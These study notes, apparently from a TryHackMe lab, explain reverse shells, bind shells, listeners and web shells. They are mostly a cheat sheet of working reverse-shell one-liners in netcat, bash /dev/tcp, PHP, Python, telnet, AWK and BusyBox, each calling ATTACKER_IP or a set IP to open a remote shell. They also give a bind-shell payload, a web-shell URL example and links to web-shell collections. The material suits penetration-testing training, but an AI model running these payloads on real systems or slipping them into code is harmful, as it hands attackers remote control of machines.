### **What is a Shell?**

A **shell** is software that lets a user interact with an operating system. Usually a **command-line interface (CLI)** (e.g., Bash), though it can be graphical. In cybersecurity, a shell refers to an **attacker’s command session** on a compromised system.
### **Why Shell Access Matters**

Once an attacker gets a shell, they can:

- **Remote System Control** → Run commands and programs on the target
- **Privilege Escalation** → Upgrade from low-privileged to admin/root access
- **Data Exfiltration** → Locate, read, and steal sensitive data
- **Persistence** → Create users, backdoors, or scheduled access
- **Post-Exploitation** → Deploy malware, hide activity, remove evidence
- **Pivoting** → Use the compromised system to attack other network hosts

---
# **Reverse Shells (Netcat) 

**Reverse shell:** Target system initiates a connection back to the attacker, giving remote shell access.

**Listener setup (attacker):**

```
  nc -lvnp 443
``` 

- `-l`: listen
- `-v`: verbose
- `-n`: no DNS
- `-p`: port
- Common ports (53, 80, 443, etc.) help blend with normal traffic.

**Reverse shell payload (example – pipe/FIFO):**

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

- `rm -f /tmp/f` → Removes any existing pipe to avoid conflicts
- `mkfifo /tmp/f` → Creates a named pipe (FIFO) for two-way communication
- `cat /tmp/f` → Reads commands sent through the pipe
- `| sh -i 2>&1` → Executes commands in an interactive shell and sends errors + output
- `| nc ATTACKER_IP ATTACKER_PORT` → Sends shell I/O to attacker via Netcat
- `>/tmp/f` → Sends attacker input back into the pipe

---
# Bind Shell

As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

- **Bind shell:** Target opens (binds) a port and listens; attacker connects to it to get a shell.
- **Use case:** When the target **cannot make outbound connections**.
- **Downside:** Easier to detect since it listens on an open port.

This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.

**Bind Shell Payload (run on target):**

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

- `rm -f /tmp/f` → Removes existing pipe
- `mkfifo /tmp/f` → Creates FIFO for two-way communication
- `cat /tmp/f` → Reads attacker input
- `| bash -i 2>&1` → Interactive shell with error/output redirection
- `| nc -l 0.0.0.0 8080` → Netcat listens on all interfaces, port 8080
- `>/tmp/f` → Sends output back into the pipe

> Ports **<1024 require root**, so 8080 avoids privilege issues.

**Attacker connects:**
```
nc -nv TARGET_IP 8080
```

- `nc` - This invokes Netcat, which establishes the connection to the target.
- `-n` - Disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.
- `-v` - Verbose mode provides detailed output of the connection process, such as when the connection is established.
- `TARGET_IP` - The IP address of the target machine where the bind shell is running.
- `8080` - The port number on which the bind shell listens.

**Attacker Terminal (After Connection)**
```shell-session
attacker@kali:~$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

---
# **Shell Listeners 

A **listener** waits for an incoming reverse shell connection and lets the attacker interact with it.

### **Netcat (basic)** : Common, simple listener


```
nc -lvnp 443
```

- No line editing or history by default.

### **Rlwrap (Netcat enhancement)** : Adds **arrow keys, command history, and editing**.


```
lwrap nc -lvnp 443
```

 - Wraps Netcat for better shell usability.

### **Ncat (Netcat by Nmap)** : More features, including **SSL encryption**.


**Basic listener:**
```
ncat -lvnp 4444
```

**SSL-encrypted listener:**
```
ncat --ssl -lvnp 4444
```

- `--ssl` encrypts the reverse shell traffic.

### **Socat** : Powerful tool for connecting data streams/sockets.

**Listener example:**
```
socat -d -d TCP-LISTEN:443 STDOUT
```

- `-d -d` → Increased verbosity
- `TCP-LISTEN:443` → Listen on port 443
- `STDOUT` → Output received data to terminal

---
# Shell Payloads

A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell.

Let's explore some of these payloads that can be used in the Linux OS to expose the shell through the most popular **reverse shell**.  

## ==`Bash`==

**Normal Bash Reverse Shell**

```shell-session
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```

This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (**ATTACKER_IP**) on port `443`. The `>&` operator combines both standard output and standard error.

  

**Bash Read Line** **Reverse Shell**

```shell-session
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```

This reverse shell creates a new file descriptor (`5` in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.

  

**Bash With File Descriptor 196** **Reverse Shell**

```shell-session
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```

This reverse shell uses a file descriptor (`196` in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.

  

**Bash With File Descriptor 5** **Reverse Shell**

```shell-session
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

Similar to the first example, this command opens a shell (`bash -i`), but it uses file descriptor `5` for input and output, enabling an interactive session over the TCP connection.

## ==`PHP`==

**PHP Reverse Shell Using the exec Function**

```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```

This reverse shell creates a socket connection to the attacker's IP on port `443` and uses the `exec` function to execute a shell, redirecting standard input and output.

  

**PHP Reverse Shell Using the shell_exec Function**

```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

Similar to the previous command, but uses the `shell_exec` function.

  

**PHP Reverse Shell Using the system Function**

```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
```

This reverse shell employs the `system` function, which executes the command and outputs the result to the browser.

  

**PHP Reverse Shell Using the passthru Function**

```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

The `passthru` function executes a command and sends raw output back to the browser. This is useful when working with binary data.

  

**PHP Reverse Shell Using the popen Function**

```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
```

This reverse shell uses `popen` to open a process file pointer, allowing the shell to be executed.

## ==`Python`==

### ﻿Please note, the following snippets below require using `python -c` to run, indicated by the placeholder PY-C  

**Python Reverse Shell by Exporting Environment Variables**

```shell-session
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```

This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.

**Python Reverse Shell Using the subprocess Module**

```shell-session
target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```

This reverse shell uses the `subprocess` module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.  

**Short Python Reverse Shell**

```shell-session
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

This reverse shell creates a socket (`s`), connects to the attacker, and redirects standard input, output, and error to the socket using `os.dup2()`.

## ==`Others`==  

**Telnet**

```shell-session
target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```

This reverse shell creates a named pipe using `mkfifo` and connects to the attacker via Telnet on IP `ATTACKER_IP` and port `443`. 

**AWK**

```shell-session
target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

This reverse shell uses AWK’s built-in TCP capabilities to connect to `ATTACKER_IP:443`. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.

**BusyBox**

```shell-session
target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
```

This BusyBox reverse shell uses Netcat (`nc`) to connect to the attacker at `ATTACKER_IP:443`. Once connected, it executes `/bin/sh`, exposing the command line to the attacker.

---
# Web Shell

A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.

Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts. 

### Example PHP Web Shell

Let’s look at an example PHP web shell to understand how this process works:
![[Pasted image 20260211005654.png]]

- Saved as `shell.php`
- Uploaded via vulnerabilities (file upload, file inclusion, command injection, etc.)
- Accessed through:

```
http://victim.com/uploads/shell.php?cmd=whoami
```
Executes the command and displays output in the browser.

### Existing Web Shells Available Online

The power of supported languages by the web servers can result in web shells with lots of functionality and avoid detection at the same time. Let's explore some of the most popular web shells that can be found online 

[p0wny-shell](https://github.com/flozz/p0wny-shell) - A minimalistic single-file PHP web shell that allows remote command execution.
 ![The image is a screenshot of the web shell p0wny-shell showing commands being executed in a GUI similar to a real terminal](https://tryhackme-images.s3.amazonaws.com/user-uploads/66c513e4445cb5649e636a36/room-content/66c513e4445cb5649e636a36-1727563529557.png)

[b374k shell](https://github.com/b374k/b374k) - A more feature-rich PHP web shell with file management and command execution, among other functionalities.  
    
    ![The image is a screenshot of b374k shell displaying the file manager feature that allows to manipulate files](https://tryhackme-images.s3.amazonaws.com/user-uploads/66c513e4445cb5649e636a36/room-content/66c513e4445cb5649e636a36-1727563529904.png)
    
- [c99 shell](https://www.r57shell.net/single.php?id=13) - A well-known and robust PHP web shell with extensive functionality.  
    
    ![The image is a screenshot of  c99 shell displaying the command execution feature and the file manipulation one](https://tryhackme-images.s3.amazonaws.com/user-uploads/66c513e4445cb5649e636a36/room-content/66c513e4445cb5649e636a36-1727563530257.png)
    

You can find more web shells at: [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php).